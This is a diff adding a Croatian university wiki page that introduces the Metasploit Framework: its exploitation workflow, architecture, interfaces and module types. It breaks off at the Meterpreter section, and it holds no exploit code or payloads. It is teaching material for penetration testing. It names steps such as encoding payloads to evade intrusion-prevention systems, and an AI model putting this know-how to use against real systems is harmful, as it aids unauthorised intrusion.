@@ -1,0 +1,1060 @@
+<!DOCTYPE html>
+<html lang="hr" dir="ltr">
+<head>
+<meta charset="UTF-8" />
+<title>Metasploit framework i izrada modula za MSF - SIS Wiki</title>
+<meta name="generator" content="MediaWiki 1.17.0" />
+<link rel="shortcut icon" href="http://security.foi.hr/favicon.ico" />
+<link rel="search" type="application/opensearchdescription+xml" href="../opensearch_desc.php" title="SIS Wiki (hr)" />
+<link rel="EditURI" type="application/rsd+xml" href="../api.php%3Faction=rsd" />
+<link title="Creative Commons" type="application/rdf+xml" href="http://security.foi.hr/wiki/index.php?title=Metasploit_framework_i_izrada_modula_za_MSF&amp;action=creativecommons" rel="meta" />
+<link rel="copyright" href="http://creativecommons.org/licenses/by-sa/3.0/" />
+<link rel="alternate" type="application/atom+xml" title="SIS Wiki Atom izvor" href="../index.php%3Ftitle=Posebno:Nedavne_promjene&amp;feed=atom" />
+<link rel="stylesheet" href="../load.php%3Fdebug=false&amp;lang=hr&amp;modules=mediawiki.legacy.commonPrint%252Cshared%257Cskins.vector&amp;only=styles&amp;skin=vector&amp;*.css" />
+<meta name="ResourceLoaderDynamicStyles" content="" />
+<!--[if lt IE 7]><style type="text/css">body{behavior:url("/wiki/skins/vector/csshover.min.htc")}</style><![endif]--></head>
+<body class="mediawiki ltr ns-0 ns-subject page-Metasploit_framework_i_izrada_modula_za_MSF skin-vector">
+		<div id="mw-page-base" class="noprint"></div>
+		<div id="mw-head-base" class="noprint"></div>
+		<!-- content -->
+		<div id="content">
+			<a id="top"></a>
+			<div id="mw-js-message" style="display:none;"></div>
+						<!-- firstHeading -->
+			<h1 id="firstHeading" class="firstHeading">Metasploit framework i izrada modula za MSF</h1>
+			<!-- /firstHeading -->
+			<!-- bodyContent -->
+			<div id="bodyContent">
+				<!-- tagline -->
+				<div id="siteSub">Izvor: SIS Wiki</div>
+				<!-- /tagline -->
+				<!-- subtitle -->
+				<div id="contentSub"></div>
+				<!-- /subtitle -->
+																<!-- jumpto -->
+				<div id="jump-to-nav">
+					Skoči na: <a href="Metasploit_framework_i_izrada_modula_za_MSF.html#mw-head">orijentacija</a>,
+					<a href="Metasploit_framework_i_izrada_modula_za_MSF.html#p-search">traži</a>
+				</div>
+				<!-- /jumpto -->
+								<!-- bodytext -->
+				<p>Krunoslav Đuras, Nikola Dugandžić
+</p>
+	<table id="toc" class="toc"><tr><td><div id="toctitle"><h2>Sadržaj</h2></div>
+<ul>
+<li class="toclevel-1"><a href="Metasploit_framework_i_izrada_modula_za_MSF.html#Metasploit_Framework"><span class="tocnumber">1</span> <span class="toctext">Metasploit Framework</span></a></li>
+<li class="toclevel-1"><a href="Metasploit_framework_i_izrada_modula_za_MSF.html#Arhitektura_Metasploit_Framework-a"><span class="tocnumber">2</span> <span class="toctext">Arhitektura Metasploit Framework-a</span></a>
+<ul>
+<li class="toclevel-2"><a href="Metasploit_framework_i_izrada_modula_za_MSF.html#Rex"><span class="tocnumber">2.1</span> <span class="toctext">Rex</span></a></li>
+<li class="toclevel-2"><a href="Metasploit_framework_i_izrada_modula_za_MSF.html#MSF_Core"><span class="tocnumber">2.2</span> <span class="toctext">MSF Core</span></a></li>
+<li class="toclevel-2"><a href="Metasploit_framework_i_izrada_modula_za_MSF.html#MSF_Base"><span class="tocnumber">2.3</span> <span class="toctext">MSF Base</span></a></li>
+<li class="toclevel-2"><a href="Metasploit_framework_i_izrada_modula_za_MSF.html#Su.C4.8Delja_za_MSF"><span class="tocnumber">2.4</span> <span class="toctext">Sučelja za MSF</span></a>
+<ul>
+<li class="toclevel-3"><a href="Metasploit_framework_i_izrada_modula_za_MSF.html#Grafi.C4.8Dko_korisni.C4.8Dko_su.C4.8Delje_.E2.80.93_msfgui"><span class="tocnumber">2.4.1</span> <span class="toctext">Grafičko korisničko sučelje – msfgui</span></a></li>
+<li class="toclevel-3"><a href="Metasploit_framework_i_izrada_modula_za_MSF.html#Msfconsole"><span class="tocnumber">2.4.2</span> <span class="toctext">Msfconsole</span></a></li>
+<li class="toclevel-3"><a href="Metasploit_framework_i_izrada_modula_za_MSF.html#Msfcli"><span class="tocnumber">2.4.3</span> <span class="toctext">Msfcli</span></a></li>
+<li class="toclevel-3"><a href="Metasploit_framework_i_izrada_modula_za_MSF.html#Armitage"><span class="tocnumber">2.4.4</span> <span class="toctext">Armitage</span></a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li class="toclevel-1"><a href="Metasploit_framework_i_izrada_modula_za_MSF.html#Metasploit_moduli"><span class="tocnumber">3</span> <span class="toctext">Metasploit moduli</span></a></li>
+<li class="toclevel-1"><a href="Metasploit_framework_i_izrada_modula_za_MSF.html#Osnove_rada_sa_Metasploit_Frameworkom"><span class="tocnumber">4</span> <span class="toctext">Osnove rada sa Metasploit Frameworkom</span></a>
+<ul>
+<li class="toclevel-2"><a href="Metasploit_framework_i_izrada_modula_za_MSF.html#Baze_podataka"><span class="tocnumber">4.1</span> <span class="toctext">Baze podataka</span></a></li>
+<li class="toclevel-2"><a href="Metasploit_framework_i_izrada_modula_za_MSF.html#Metasploit_Meterpreter"><span class="tocnumber">4.2</span> <span class="toctext">Metasploit Meterpreter</span></a>
+<ul>
+<li class="toclevel-3"><a href="Metasploit_framework_i_izrada_modula_za_MSF.html#Osnovne_komande"><span class="tocnumber">4.2.1</span> <span class="toctext">Osnovne komande</span></a>
+<ul>
+<li class="toclevel-4"><a href="Metasploit_framework_i_izrada_modula_za_MSF.html#.3F.2C_help"><span class="tocnumber">4.2.1.1</span> <span class="toctext">?, help</span></a></li>
+<li class="toclevel-4"><a href="Metasploit_framework_i_izrada_modula_za_MSF.html#background"><span class="tocnumber">4.2.1.2</span> <span class="toctext">background</span></a></li>
+<li class="toclevel-4"><a href="Metasploit_framework_i_izrada_modula_za_MSF.html#channel"><span class="tocnumber">4.2.1.3</span> <span class="toctext">channel</span></a></li>
+<li class="toclevel-4"><a href="Metasploit_framework_i_izrada_modula_za_MSF.html#close"><span class="tocnumber">4.2.1.4</span> <span class="toctext">close</span></a></li>
+<li class="toclevel-4"><a href="Metasploit_framework_i_izrada_modula_za_MSF.html#exit.2C_quit"><span class="tocnumber">4.2.1.5</span> <span class="toctext">exit, quit</span></a></li>
+<li class="toclevel-4"><a href="Metasploit_framework_i_izrada_modula_za_MSF.html#interact"><span class="tocnumber">4.2.1.6</span> <span class="toctext">interact</span></a></li>
+<li class="toclevel-4"><a href="Metasploit_framework_i_izrada_modula_za_MSF.html#irb"><span class="tocnumber">4.2.1.7</span> <span class="toctext">irb</span></a></li>
+<li class="toclevel-4"><a href="Metasploit_framework_i_izrada_modula_za_MSF.html#migrate"><span class="tocnumber">4.2.1.8</span> <span class="toctext">migrate</span></a></li>
+<li class="toclevel-4"><a href="Metasploit_framework_i_izrada_modula_za_MSF.html#read"><span class="tocnumber">4.2.1.9</span> <span class="toctext">read</span></a></li>
+<li class="toclevel-4"><a href="Metasploit_framework_i_izrada_modula_za_MSF.html#run"><span class="tocnumber">4.2.1.10</span> <span class="toctext">run</span></a></li>
+<li class="toclevel-4"><a href="Metasploit_framework_i_izrada_modula_za_MSF.html#use"><span class="tocnumber">4.2.1.11</span> <span class="toctext">use</span></a></li>
+<li class="toclevel-4"><a href="Metasploit_framework_i_izrada_modula_za_MSF.html#write"><span class="tocnumber">4.2.1.12</span> <span class="toctext">write</span></a></li>
+</ul>
+</li>
+<li class="toclevel-3"><a href="Metasploit_framework_i_izrada_modula_za_MSF.html#File_system_commands"><span class="tocnumber">4.2.2</span> <span class="toctext">File system commands</span></a>
+<ul>
+<li class="toclevel-4"><a href="Metasploit_framework_i_izrada_modula_za_MSF.html#cat"><span class="tocnumber">4.2.2.1</span> <span class="toctext">cat</span></a></li>
+<li class="toclevel-4"><a href="Metasploit_framework_i_izrada_modula_za_MSF.html#cd"><span class="tocnumber">4.2.2.2</span> <span class="toctext">cd</span></a></li>
+<li class="toclevel-4"><a href="Metasploit_framework_i_izrada_modula_za_MSF.html#download"><span class="tocnumber">4.2.2.3</span> <span class="toctext">download</span></a></li>
+<li class="toclevel-4"><a href="Metasploit_framework_i_izrada_modula_za_MSF.html#edit"><span class="tocnumber">4.2.2.4</span> <span class="toctext">edit</span></a></li>
+<li class="toclevel-4"><a href="Metasploit_framework_i_izrada_modula_za_MSF.html#getlwd"><span class="tocnumber">4.2.2.5</span> <span class="toctext">getlwd</span></a></li>
+<li class="toclevel-4"><a href="Metasploit_framework_i_izrada_modula_za_MSF.html#getwd"><span class="tocnumber">4.2.2.6</span> <span class="toctext">getwd</span></a></li>
+<li class="toclevel-4"><a href="Metasploit_framework_i_izrada_modula_za_MSF.html#lcd"><span class="tocnumber">4.2.2.7</span> <span class="toctext">lcd</span></a></li>
+<li class="toclevel-4"><a href="Metasploit_framework_i_izrada_modula_za_MSF.html#lpwd"><span class="tocnumber">4.2.2.8</span> <span class="toctext">lpwd</span></a></li>
+<li class="toclevel-4"><a href="Metasploit_framework_i_izrada_modula_za_MSF.html#ls"><span class="tocnumber">4.2.2.9</span> <span class="toctext">ls</span></a></li>
+<li class="toclevel-4"><a href="Metasploit_framework_i_izrada_modula_za_MSF.html#mkdir"><span class="tocnumber">4.2.2.10</span> <span class="toctext">mkdir</span></a></li>
+<li class="toclevel-4"><a href="Metasploit_framework_i_izrada_modula_za_MSF.html#pwd"><span class="tocnumber">4.2.2.11</span> <span class="toctext">pwd</span></a></li>
+<li class="toclevel-4"><a href="Metasploit_framework_i_izrada_modula_za_MSF.html#rmdir"><span class="tocnumber">4.2.2.12</span> <span class="toctext">rmdir</span></a></li>
+<li class="toclevel-4"><a href="Metasploit_framework_i_izrada_modula_za_MSF.html#upload"><span class="tocnumber">4.2.2.13</span> <span class="toctext">upload</span></a></li>
+</ul>
+</li>
+<li class="toclevel-3"><a href="Metasploit_framework_i_izrada_modula_za_MSF.html#Networking_Commands"><span class="tocnumber">4.2.3</span> <span class="toctext">Networking Commands</span></a>
+<ul>
+<li class="toclevel-4"><a href="Metasploit_framework_i_izrada_modula_za_MSF.html#ipconfig"><span class="tocnumber">4.2.3.1</span> <span class="toctext">ipconfig</span></a></li>
+<li class="toclevel-4"><a href="Metasploit_framework_i_izrada_modula_za_MSF.html#portfwd"><span class="tocnumber">4.2.3.2</span> <span class="toctext">portfwd</span></a></li>
+<li class="toclevel-4"><a href="Metasploit_framework_i_izrada_modula_za_MSF.html#route"><span class="tocnumber">4.2.3.3</span> <span class="toctext">route</span></a></li>
+</ul>
+</li>
+<li class="toclevel-3"><a href="Metasploit_framework_i_izrada_modula_za_MSF.html#System_commands"><span class="tocnumber">4.2.4</span> <span class="toctext">System commands</span></a>
+<ul>
+<li class="toclevel-4"><a href="Metasploit_framework_i_izrada_modula_za_MSF.html#execute"><span class="tocnumber">4.2.4.1</span> <span class="toctext">execute</span></a></li>
+<li class="toclevel-4"><a href="Metasploit_framework_i_izrada_modula_za_MSF.html#getpid"><span class="tocnumber">4.2.4.2</span> <span class="toctext">getpid</span></a></li>
+<li class="toclevel-4"><a href="Metasploit_framework_i_izrada_modula_za_MSF.html#getuid"><span class="tocnumber">4.2.4.3</span> <span class="toctext">getuid</span></a></li>
+<li class="toclevel-4"><a href="Metasploit_framework_i_izrada_modula_za_MSF.html#kill"><span class="tocnumber">4.2.4.4</span> <span class="toctext">kill</span></a></li>
+<li class="toclevel-4"><a href="Metasploit_framework_i_izrada_modula_za_MSF.html#ps"><span class="tocnumber">4.2.4.5</span> <span class="toctext">ps</span></a></li>
+<li class="toclevel-4"><a href="Metasploit_framework_i_izrada_modula_za_MSF.html#reboot"><span class="tocnumber">4.2.4.6</span> <span class="toctext">reboot</span></a></li>
+<li class="toclevel-4"><a href="Metasploit_framework_i_izrada_modula_za_MSF.html#reg"><span class="tocnumber">4.2.4.7</span> <span class="toctext">reg</span></a></li>
+<li class="toclevel-4"><a href="Metasploit_framework_i_izrada_modula_za_MSF.html#rev2self"><span class="tocnumber">4.2.4.8</span> <span class="toctext">rev2self</span></a></li>
+<li class="toclevel-4"><a href="Metasploit_framework_i_izrada_modula_za_MSF.html#shutdown"><span class="tocnumber">4.2.4.9</span> <span class="toctext">shutdown</span></a></li>
+<li class="toclevel-4"><a href="Metasploit_framework_i_izrada_modula_za_MSF.html#sysinfo"><span class="tocnumber">4.2.4.10</span> <span class="toctext">sysinfo</span></a></li>
+</ul>
+</li>
+<li class="toclevel-3"><a href="Metasploit_framework_i_izrada_modula_za_MSF.html#User_Interface_Commands"><span class="tocnumber">4.2.5</span> <span class="toctext">User Interface Commands</span></a>
+<ul>
+<li class="toclevel-4"><a href="Metasploit_framework_i_izrada_modula_za_MSF.html#enumdesktops"><span class="tocnumber">4.2.5.1</span> <span class="toctext">enumdesktops</span></a></li>
+<li class="toclevel-4"><a href="Metasploit_framework_i_izrada_modula_za_MSF.html#idletime"><span class="tocnumber">4.2.5.2</span> <span class="toctext">idletime</span></a></li>
+<li class="toclevel-4"><a href="Metasploit_framework_i_izrada_modula_za_MSF.html#keyscan_dump"><span class="tocnumber">4.2.5.3</span> <span class="toctext">keyscan_dump</span></a></li>
+<li class="toclevel-4"><a href="Metasploit_framework_i_izrada_modula_za_MSF.html#keyscan_start"><span class="tocnumber">4.2.5.4</span> <span class="toctext">keyscan_start</span></a></li>
+<li class="toclevel-4"><a href="Metasploit_framework_i_izrada_modula_za_MSF.html#keyscan_stop"><span class="tocnumber">4.2.5.5</span> <span class="toctext">keyscan_stop</span></a></li>
+<li class="toclevel-4"><a href="Metasploit_framework_i_izrada_modula_za_MSF.html#setdesktop"><span class="tocnumber">4.2.5.6</span> <span class="toctext">setdesktop</span></a></li>
+<li class="toclevel-4"><a href="Metasploit_framework_i_izrada_modula_za_MSF.html#uictl"><span class="tocnumber">4.2.5.7</span> <span class="toctext">uictl</span></a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li class="toclevel-1"><a href="Metasploit_framework_i_izrada_modula_za_MSF.html#Izrada_modula_za_MSF"><span class="tocnumber">5</span> <span class="toctext">Izrada modula za MSF</span></a>
+<ul>
+<li class="toclevel-2"><a href="Metasploit_framework_i_izrada_modula_za_MSF.html#Izrada_exploitova"><span class="tocnumber">5.1</span> <span class="toctext">Izrada exploitova</span></a>
+<ul>
+<li class="toclevel-3"><a href="Metasploit_framework_i_izrada_modula_za_MSF.html#Fuzzing"><span class="tocnumber">5.1.1</span> <span class="toctext">Fuzzing</span></a></li>
+</ul>
+</li>
+<li class="toclevel-2"><a href="Metasploit_framework_i_izrada_modula_za_MSF.html#Izrada_encodera"><span class="tocnumber">5.2</span> <span class="toctext">Izrada encodera</span></a></li>
+<li class="toclevel-2"><a href="Metasploit_framework_i_izrada_modula_za_MSF.html#Izrada_payloadova"><span class="tocnumber">5.3</span> <span class="toctext">Izrada payloadova</span></a>
+<ul>
+<li class="toclevel-3"><a href="Metasploit_framework_i_izrada_modula_za_MSF.html#Shellcode"><span class="tocnumber">5.3.1</span> <span class="toctext">Shellcode</span></a></li>
+<li class="toclevel-3"><a href="Metasploit_framework_i_izrada_modula_za_MSF.html#Postupak_izrade_vlastitog_shellcodea"><span class="tocnumber">5.3.2</span> <span class="toctext">Postupak izrade vlastitog shellcodea</span></a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li class="toclevel-1"><a href="Metasploit_framework_i_izrada_modula_za_MSF.html#Prakti.C4.8Dni_dio_-_primjer_izrade_payloada"><span class="tocnumber">6</span> <span class="toctext">Praktični dio - primjer izrade payloada</span></a></li>
+<li class="toclevel-1"><a href="Metasploit_framework_i_izrada_modula_za_MSF.html#Prakti.C4.8Dni_dio_-_primjer_exploitacije_ranjivog_ra.C4.8Dunala"><span class="tocnumber">7</span> <span class="toctext">Praktični dio - primjer exploitacije ranjivog računala</span></a></li>
+<li class="toclevel-1"><a href="Metasploit_framework_i_izrada_modula_za_MSF.html#Literatura"><span class="tocnumber">8</span> <span class="toctext">Literatura</span></a></li>
+</ul>
+</td></tr></table>
+<h2> <span class="mw-headline" id="Metasploit_Framework">Metasploit Framework</span></h2>
+	<p align="justify">
+        Metasploit framework je alat za razvoj exploitacijskog koda te izvršavanje istog na udaljenom ciljnom računalu.
+	
+	Metasploit framework je framework otvorenog koda. 
+	On je dizajniran kako bi stručnjacima za sigurnost i penetracijskim testerima stavio na raspolaganje brz i jedinstven način za razvoj i korištenje raznih exploitova, payloadova, encodera, NOP generatora i alata za izviđanje (engl. reconnaissance). 
+	
+	Framework programerima pruža mogućnost da iskoriste velike dijelove već prije napisanih programa bez potrebe za kopiranjem koda ili ponovnom implementacijom.
+<br /><br />
+Ova modularnost koja dozvoljava kombiniranje bilo kojih exploita sa bilo kojim payloadom je glavna prednost samog frameworka: to olakšava posao napadača, exploit i payload programera.
+<br />
+Metasploit radi na UNIX-u (uključujući Linux i Mac OS X) i na Windowsima. To uključuje dva sučelja naredbenog retka, web bazirano sučelje i izvorni GUI. Web bazirano sučelje je namijenjeno pokretanju sa računala napadača. Metasploit framework se može proširiti vanjskim dodacima (engl. add-ons) na više jezika.
+	
+	Osnovni koraci exploitacije nekog sustava uz pomoć Metasploit frameworka uključuju:</p>
+	<ol>
+	<li>Odabir i konfiguracija exploita - koda koji iskorištava neki bug u sustavu - MSF sadrži bazu velikog broja exploita (oko 1000 exploita)</li>
+	<li>Provjera da li je ciljani sustav ranjiv na odabrani exploit</li>
+    <li>Odabir i konfiguracija payload-a - koda koji će se izvršiti na ciljanom sustavu nakon uspješne exploitacije - npr. remote shell</li>
+	<li>Odabir tehnike kodiranja sa kojom će se kodirati payload - radi smanjenja rizika da će IPS sustavi detektirati payload</li>
+    <li>Izvršavanje exploita</li>
+	</ol>
+<p><br />
+Kako bi se odabrao odgovarajući exploit i payload, potrebne su neke informacije o ciljnom sustavu kao što je verzija OS-a i instalirane mrežne usluge. Ove informacije se mogu očitati sa skeniranjem portova i alatima za otisak prsta OS-a (engl.OS fingerprinting tools) kao što je Nmap. Skeneri za ranjivost kao što su Nexpose ili Nessus mogu otkriti ranjivosti ciljnog sustava. Metasploit može uvesti skenirane podatke o ranjivosti i usporediti identificirane ranjivosti sa postojećim exploit modulima za precizniju eksploataciju. 
+</p><p>MSF se u današnje vrijeme smatra pojedinačno najčešće korisnim alatom za reviziju koji je besplatno dostupan za profesionalce IT sigurnosti. Iz širokog spektra exploita komercijalnih razreda i opsežnog okruženja za razvoj exploita, pa sve do alata za prikupljanje informacija o mreži i plugina za ranjivosti weba. Metasploit framework pruža zaista impresivno radno okruženje. MSF je mnogo više nego samo kolekcija exploita, to je infrastruktura koju je moguće nadograđivati i koristiti prema prilagođenim potrebama. Time se korisnici mogu koncentrirati na svoje jedinstveno okruženje bez potrebe da moraju „izmišljati točak“.
+<br />
+</p>
+<h2> <span class="mw-headline" id="Arhitektura_Metasploit_Framework-a">Arhitektura Metasploit Framework-a</span></h2>
+<p>Na sljedećoj slici prikazana je arhitektura Metasploit Framework-a
+</p>
+<div class="center"><div class="floatnone"><a href="http://security.foi.hr/wiki/index.php/Datoteka:MSF_arhitektura.png" class="image"><img alt="MSF arhitektura.png" src="../images/thumb/4/44/MSF_arhitektura.png/500px-MSF_arhitektura.png" width="500" height="344" /></a></div></div>
+<p><br />
+<br />
+Framework je dizajniran da bude čim više modularan kako bi potaknuo ponovnu upotrebu koda kroz različite projekte. Najbitniji komad arhitekture je Rex biblioteka što je u biti skraćena Ruby Extension biblioteka. Neke komponente koje pruža Rex uključuju podsustav omotanih socketa (engl. wrapper socket subsystem), implementacije klijentskih protokola i servera, podsustav prijave, uslužne klase za eksploataciju i još mnogo drugih korisnih klasa. Rex je sam po sebi dizajniran kako ne bi imao ovisnosti o ničem drugom nego samo o onom što dođe sa zadanom instalacijom Ruby-a. U slučaju da neka klasa Rex-a ovisi o nečem drugom što nije uključeno u zadanu instalaciju, onda neuspjeh u pronalasku takvih ovisnosti ne bi trebao dovesti do nemogućnosti korištenja Rex-a. 
+<br />
+Framework je sam po sebi podijeljen na par različitih dijelova, gdje je na najnižem nivou jezgra frameworka. Jezgra frameworka je odgovorna za implementaciju svih potrebnih sučelja koja dozvoljavaju interakciju sa modulima exploita, sesijama i pluginovima. Ova jezgrina biblioteka je produžena sa osnovnom bibliotekom frameworka koja je dizajnirana kako bi pružila jednostavnije omotane rutine (engl. wrapper routines) za rad sa jezgrom frameworka, kao i pružala uslužne klase za rad sa različitim aspektima frameworka, kao što je serijalizacija stanja modula u druge izlazne formate. Također, osnovna biblioteka je produžena sa korisničkim sučeljem frameworka koji ima implementiranu podršku za različite tipove korisničkih sučelja za sam framework, kao što je naredbena konzola i web sučelje. 
+<br />
+Od samog frameworka su odvojeni moduli i plugini koji su dizajnirani za podršku. Neki modul frameworka se definira kao jedan od exploita, payloada, encodera, NOP generatora ili pomoćni (engl.auxiliary). Ovi moduli imaju dobro definiranu strukturu i sučelje za učitavanje u framework. Framework plugin je veoma labavo definiran kao nešto što produžuje funkcionalnost frameworka ili povećava postojeću značajku kako bi ga promijenio da djeluje drugačijim načinima. Sljedeći odjelci će razraditi svaki od paketa opisanih iznad i različite važne podsustave pronađene unutar svakog paketa. Cijela dokumentacijal klasa i API-ja spomenutih u ovom dokumentu se mogu pronaći u dokumentaciji auto-generiranih API razina na webstranicama Metasploita.
+</p>
+<h3> <span class="mw-headline" id="Rex">Rex</span></h3>
+<p>Rex biblioteka je zbirka klasa i modula koji možda mogu biti korisni za više nego jedan projekt. Najkorisnije klase koje pruža biblioteka su dokumentirane u u sljedećim potpoglavljima. Kako bi koristili Rex biblioteku, ruby skripti je potreban rex. Kada se pišu exploiti često je nužno generirati skup instrukcija usput sa promjenjivim operandima kao što su neposredne vrijednosti, registri itd. Za podršku ovoj potrebi, Rex biblioteka pruža klase pod Rex::Arch namespace koji implementira generacijske rutine operacijskog koda ovisnog o arhitekturi kao i druge metode specifičke arhitekture, kao što su pakiranja cijelih brojeva (engl. integer packing). Često puta će ranjivosti imati zajednički vektor napada ili će im biti potreban specifičan redoslied operacija kako bi postigli krajnji cilj izvršavanja koda. Kao pomoć po tom pitanju, Rex biblioteka pruža skup klasa koje implementiraju neke od najčešćih potreba koje bi exploiti možda trebali imati.</p>
+<p>Rex biblioteka pruža podršku za osnovno logiranje stringova u proizvoljna log sinkroniziranja, kao što su nestrukturirane datoteke ili baza podataka. Sučelje za logove je dostupno programerima kroz skup globalno definiranih metoda:dlog,ilog,wlog,elog i rlog. Ove metode predstavljaju debug logove, informacijske logove, logove upozorenja, logove o greškama i sirove logove respektivno. Svaka metoda može prenijeti log poruku, izvor loga (naziv komponente ili paketa odakle je došla poruka), i log razinu koja je broj između 0 i 3. Izvori logova se mogu registrirati usput registriranjem izvora loga i njihova log razina se može postaviti postavljanjem log razine.<br /><br />
+Rex biblioteka pruža ipmlementacije na strani klijenta za neke napredne posteksploatacijske kolekcije programa kao što su DispatchNinja i Meterpreter. Ta dva posteksploatacijska korisnička sučelja su dizajnirana kako bi se mogla koristiti izvan konteksta exploita. Rex::Post namespace pruža skup klasa u svom korijenu koje su namijenjene da djeluju kao generalizirana sučelja na udaljenim sustavima preko posteksploatacijskih klijenata, ako je podržan. Ove klase dozvoljavaju programerima da napišu automatizirane alata koji mogu raditi na udaljenim računalima na način koji nije ovisan o platformi. Iako je istina da platformama mogu nedostajati analogni skupovi značajki za neke akcije, većina zajedničkih skupova akcija
+će imati istu funkcionalnost.  </p>
+<h3> <span class="mw-headline" id="MSF_Core">MSF Core</span></h3>
+<p>Jezgra frameworka implementira skup klasa koje pružaju sučelju framework module i plugine. Dio jezgre frameworka je dizajniran kako bi se koristio u pristupu baziranom na instancama. To znači da stanje čitavog frameworka može biti sadržano unutar jedne instance klase pa prema tome može dozvoliti programerima da imaju više istodobnih i odvojenih instanci frameworka u uporabi u istom vremenu, a ne da sve prisilno dijeli jednu singleton instancu. Jezgra frameworka se sastoji od nekoliko različitih upravljača koji su odgovorni za neke od osnovnih aspekata frameworka, kao što je upravljanje modulima i pluginovima.  </p>
+<h3> <span class="mw-headline" id="MSF_Base">MSF Base</span></h3>
+<p>Baza frameworka je sloj biblioteke izgrađen na vrhu jezgre frameworka koja dodaje klase koje olakšavaju rad sa frameworkom. Također pruža skup klasa koje bi možda mogle koristiti alatima za razvoj od strane trećih stranki koje nužno ne spadaju unutar okvira jezgre frameworka. Klase koje izgrađuju framework bazu su opisane u sljedećim poglavljima. Kako bi se koristila bazna framework biblioteka, ruby skripti će biti potreban msf/base.</p>
+<p>--<a href="http://security.foi.hr/wiki/index.php?title=Suradnik:Ndugandzi&amp;action=edit&amp;redlink=1" class="new" title="Suradnik:Ndugandzi (stranica ne postoji)">Ndugandzi</a> 14:55, 20. siječnja 2013. (CET)
+</p>
+<h3> <span class="mw-headline" id="Su.C4.8Delja_za_MSF">Sučelja za MSF</span></h3>
+<p>Metasploit frameworok pruža GUI sučelja, konzolno sučelje zvano msfconsole i sučelje naredbenog retka zvano msfcli.
+</p>
+<h4> <span class="mw-headline" id="Grafi.C4.8Dko_korisni.C4.8Dko_su.C4.8Delje_.E2.80.93_msfgui">Grafičko korisničko sučelje – msfgui</span></h4>
+<p>Kako bi otvorili metasploit gui , potrebno je otvoriti terminal i napisati msfgui. Iz Metasploit grafičkog korisničkog sučelja je moguće gotovo skoro iste stvari raditi kao i sa drugih sučelja. GUI je jako koristan ukoliko se radi o novom korisniku Metasploit frameworka.
+</p>
+<div class="center"><div class="floatnone"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Msfgui.png" class="image"><img alt="Msfgui.png" src="../images/thumb/8/87/Msfgui.png/600px-Msfgui.png" width="600" height="420" /></a></div></div>
+<h4> <span class="mw-headline" id="Msfconsole">Msfconsole</span></h4>
+<p>MSFconsole je vjerojatno najpopularnije sučelje MSF-a. Pruža centraliziranu konzolu koja je sve u jednom i koja dozvoljava učinkovit pristup gotovo svim opcijama dostupnim u Metasploit frameworku. MSFconsole možda djeluje zastrašujuća na prvi pogled, ali kad se nauči sintaksa naredbi onda će korisnik naučiti cijeniti snagu korištenja ovog sučelja. MSFconsole je najpopularnije sučelje Metasploit frameworka. Pruža sve što je potrebno kako bi se pokrenuo exploit, učitali pomoćni (engl. auxiliary) moduli, izvela prebrojavanja, stvorili slušatelji ili pokrenuli masovnu eksploataciju protiv višestrukih ciljeva. To je jedini podržani način kako bi se pristupilo većini značajki unutar Metasploita i to je najstabilnije Metasploit sučelje. MSFconsole pruža mogućnost otvaranja tabova (engl. tab completion). Kako bi se otvorila MSFconsole potrebno je otvoriti terminal i utipkati msfconsole. 
+</p>
+<div class="center"><div class="floatnone"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Msfconsole.png" class="image"><img alt="Msfconsole.png" src="../images/thumb/0/07/Msfconsole.png/600px-Msfconsole.png" width="600" height="359" /></a></div></div>
+<p><br />
+</p>
+<h4> <span class="mw-headline" id="Msfcli">Msfcli</span></h4>
+<p>Msfcli pruža Metasploi frameworku snažno sučelje naredbenog retka, ali ne podržava bilo kakve napredne mogućnosti automatizacije msfconsole.Msfcli je odlično sučelje za skriptiranje, koje dozvolljava preusmjeravanje outputa od drugih alata u msfcli. Msfcli se može koristiti kao msfconsole, za pokretanje exploita ili pomoćnih (auxiliary) modula, ali ga je mnogo teže koristiti.  Koristan je za specifične zadatke kao što je testiranje ili razvoj novih exploita. Msfcli je pogodan kada se točno zna koji exploit i koja opcija je potrebna. Kako bi se pokrenuo msfcli, potrebno je otvoriti terminal i upitakati msfcli. Za više pomoći potrebno je utipkati msfcli –h.
+</p>
+<h4> <span class="mw-headline" id="Armitage">Armitage</span></h4>
+<p>Armitage je besplatan GUI front-end za Metasploit framework kojeg je razvio Raphael Mudge. Kako bi se pokrenuo armitage, potrebno je utipkati armitage u terminal. 
+</p>
+<div class="center"><div class="floatnone"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Armitage.png" class="image"><img alt="Armitage.png" src="../images/thumb/b/b7/Armitage.png/400px-Armitage.png" width="400" height="269" /></a></div></div>
+<p>--<a href="http://security.foi.hr/wiki/index.php?title=Suradnik:Krudjuras&amp;action=edit&amp;redlink=1" class="new" title="Suradnik:Krudjuras (stranica ne postoji)">Krudjuras</a> 22:14, 20. siječnja 2013. (CET)
+</p>
+<h2> <span class="mw-headline" id="Metasploit_moduli">Metasploit moduli</span></h2>
+<p>U Metasploit module se ne ubrajaju samo Exploit-i, nego u njih možemo uvrstiti
+</p>
+<ul>
+  <li>
+    Exploit module
+  </li>
+  <li>
+    Payload module
+  </li>
+  <li>
+    Encoder module
+  </li>
+  <li>
+    NOP module
+  </li>
+  <li>
+    Auxiliary module
+  </li>
+</ul>
+<p>Payload-ovi su proizvoljni kodovi koji se izvršavaju prilikom uspješne primjene Exploita.
+</p>
+<h2> <span class="mw-headline" id="Osnove_rada_sa_Metasploit_Frameworkom">Osnove rada sa Metasploit Frameworkom</span></h2>
+<h3> <span class="mw-headline" id="Baze_podataka">Baze podataka</span></h3>
+<p>Kada se provodi penetracijski test, često je izazov pratiti sve što se učini na odredišnoj mreži.  Ovdje upotreba baze podataka može predstavljati veliku uštedu na vremenu. Metasploit ima ugrađenu podršku za PostgeSQL sustav baze podataka. Sustav dozvoljava brzi i jednostavni pristup skeniranju informacija, daje nam mogućnost uvoza i izvoza rezultata skeniranja sa različitih alata trećih stranaka. 
+Također možemo koristiti ove informacije kako bi poprilično brzo konfigurirali opcje modula. No, najvažnije je da čuva rezultate čistima i organiziranima. 
+</p>
+<h3> <span class="mw-headline" id="Metasploit_Meterpreter">Metasploit Meterpreter</span></h3>
